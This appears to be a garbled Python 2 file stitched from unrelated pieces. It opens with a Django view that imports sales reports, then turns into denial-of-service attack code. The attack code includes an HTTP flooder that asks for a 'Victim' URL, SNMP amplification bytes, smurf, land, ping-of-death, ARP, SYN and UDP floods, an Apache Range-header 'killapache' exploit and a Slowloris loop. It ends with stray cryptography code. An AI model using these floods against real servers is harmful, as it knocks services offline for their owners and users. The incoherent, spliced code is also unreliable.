                    mensaje = 'El reporte Costos Unitarios, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 5)
            elif (pk=='6'):
                for x in dataReader:
                    modelo = VentaCompleta()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.cliente = x['Cod Local']
                    modelo.categoria_id = x['Categoria Cliente']
                    modelo.fecha = transformarFechas(x['Dia natural'])
                    modelo.supervisor = x['Supervisor_BP-CL']
                    modelo.preventa = x['Preventa_BP-CL']
                    if x['Unidades Venta'] == '':
                        modelo.unidad = 0
                    else:
                        modelo.unidad = transformarNetos(x['Unidades Venta'])
                    if x['Kilos Venta'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos Venta'])
                    if x['Venta Neta'] == '':
                        modelo.neto = 0
                    else:
                        modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.codigoMaterial = x['Cod Material']
                    modelo.material = x['Material']
                    modelo.nivel2 = x['Nivel 2']
                    modelo.nivel3 = x['Nivel 3']
                    modelo.marca = x['Marca']
                    modelo.referencia = x['Referencia']
                    modelo.save()
                    mensaje = 'El reporte Formula de Ingreso, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 6)
            else:
                mensaje = 'Este importe no ha sido programado'
        except Exception, e:
            mensaje = 'Ha ocurrido un error interno, por favor vuelva a intentarlo: ' + str(e)
            print(str(e))
    return render(request, 'imports/success_import.html', {'mensaje': mensaje, 'context': context})	
if __name__ == '__main__':
    try:
        num_threads = input('[+] DAME[600] : ')
        t_tot = input('[s] TIME[55] : ')
        port = raw_input('[-] PORT[80] : ')
        #proxy
        in_file = open(("proxy.txt"),"r")
        proxyf = in_file.read()
        in_file.close()
        listaproxy = proxyf.split('\n')   

    except:
        t_tot = 2

    timer = t_tot * 600000
    t_tot = t_tot * 600000
    while True:
        url = raw_input('[#] Victim[http://]: ')
        try:
            host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
        except IOError:
            print 'Could not open specified url.'
        else:
            break		
    for i in xrange(num_threads):
        Spammer(url, i + 1).start()
    for x in xrange(5000):
        t = HTTPThread()
        t.start()
    print '[#] START ATTACK WEBSITE BY PL2K2 =======> '    
    nload = 0
    while not nload:
       time.sleep(1)
    time.sleep(2)
    while timer > 0:
        time.sleep(0.001)
        print 'Request ' + '', timer, '' + '', timer, '' + '', timer, '' + '', timer, '' + '', timer, ''
        Request = 999999999
        timer -= 0.001
    raw_input('> This attack is running........')
    time.sleep(1)
    Close = True

#Magic Packet getBulkEequest
    data = "\x30\x37\x02\x01\x30\x37\x02\x01\x30\x37\x02\x01" #snmp
    data += "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01" #v2
    data += "\x04\x06\x70\x75\x62\x6c\x69\x63\x75\x62\x6c\x69\x63" #community=public
    data += "\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00" #getBulkRequest
#Hold our threads
    threads = []
    for n in range(numberthreads):
        thread = threading.Thread(target=deny)
        thread.daemon = True
        thread.start()
        threads.append(thread)
        
for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False
for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            for t in rthreads:
                stop_now = True
                t.running = False
        values = sys.argv[1]
        smurfattack(values)
        smurfattack.start()
        dem = 0
        tcp_t.start()
        udp_t.start()   
        sendOverTCP(host)
        sendOverUDP(host)
        for i in rage (501):
            target = sys.argv[1]
            LandAttack(sys.argv[1])
            PingofDeath(target)
            ARPAttack(target)
        for i in range(500):
            values = sys.argv[1]
            smurfattack(values)
        for i in range(num_threads):
            Spammer(url, i+1).start()
        while True:
            if threading.activeCount() < thread_limit: 
                sendSYN().start()
                total += 1
        dem = 0
        while True:
            dem = dem+1
            syn = synFlood(ip,port,int(packets))
            syn.start()
            tcp = tcpFlood(ip,port,size,int(packets))
            tcp.start()
            udp = udpFlood(ip,port,size,int(packets))
            udp.start() 
        for i in range(0, options.threads):
            thread.start_new_thread(udpflood, (options.host, ))
            sleep(options.seconds)
            options.flooding = False
            sleep(0.25)
            port = int(sys.argv[2])
            tcp_t = Thread(target=serverTCP, args=(host,port))
            udp_t = Thread(target=serverUDP, args=(host,port))
            tcp_t.start()
            udp_t.start()
            while 1:
                    send(landAttackPacket)
            while True:
                    thread = threading.Thread(ip)
                    thread.start()
                    threads.append(thread)
            while 1:
                    sendSYN().start()
                    total += 1
                    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
            icmp_send(args[1], args[2], args[3], args[4])
            for i in range(1300):
                bad_range += ",5-{k}".format(k=k)
        
            headers = {"Range": "bytes=0-{bad_range}".format(bad_range=bad_range)}

            def testapache(urls):
        
                headers = {"Range": "bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9"}
                vuln = True
        
                for url in urls:
                    r = requests.head(url, headers=headers)
                    print "{url}\t{status_code}".format(url=url,status_code=r.status_code)
                    if not r.status_code == 206:
                        vuln = False
                return vuln

            def _kill(url):
                r = requests.head(url, headers=headers)
        
            def killapache(urls,processes, pool):
                for url in urls:
                    print "ATTACKING {url} [using {processes} processes]".format(url=url, processes=processes)
                    pool.map(_kill, [url for i in range(processes)], 1)
                    print "All processes returned"

                if (testapache(args.urls) and not args.dry):
                    pool = Pool(processes=args.processes)
                    while True:
                        killapache(args.urls, args.processes, pool)
                return 0
            for _ in range(socket_count):
                try:
                    log("Creating socket nr {}".format(_), level=2)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, 80))
                except socket.error:
                    break
                list_of_sockets.append(s)

            log("Setting up the sockets...")
            for i in list_of_sockets:
                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                for header in regular_headers:
                    s.send(bytes("{}\r\n".format(header).encode("utf-8")))

            while True:
                log("Sending keep-alive headers...")
                for i in list_of_sockets:
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    except socket.error:
                        list_of_sockets.remove(s)
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(4)
                            s.connect((ip, 80))
                            for s in list_of_sockets:
                                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                                for header in regular_headers:
                                    s.send(bytes("{}\r\n".format(header).encode("utf-8")))
                        except socket.error:
                            continue

                time.sleep(15)
            seq_s = [1, 0, 1, 1, 1, 0, 1, 0, 0, 0]

            polynomial_ring = GF(2)['X']
            X = polynomial_ring.gen()
            fun_f = X ** 4 + X + 1
        # print fun_f
        # print fun_f.is_primitive()

        # x0 + x0x1 + x3 + x0x3 + x0x1x3 + x0x2x3
            fun_g = lambda x: x[0] + x[0] * x[1] + x[3] + x[0] * x[3] + x[0] * x[1] * x[3] + x[0] * x[2] * x[3]

            HTTPRequest = httputil.HTTPServerRequest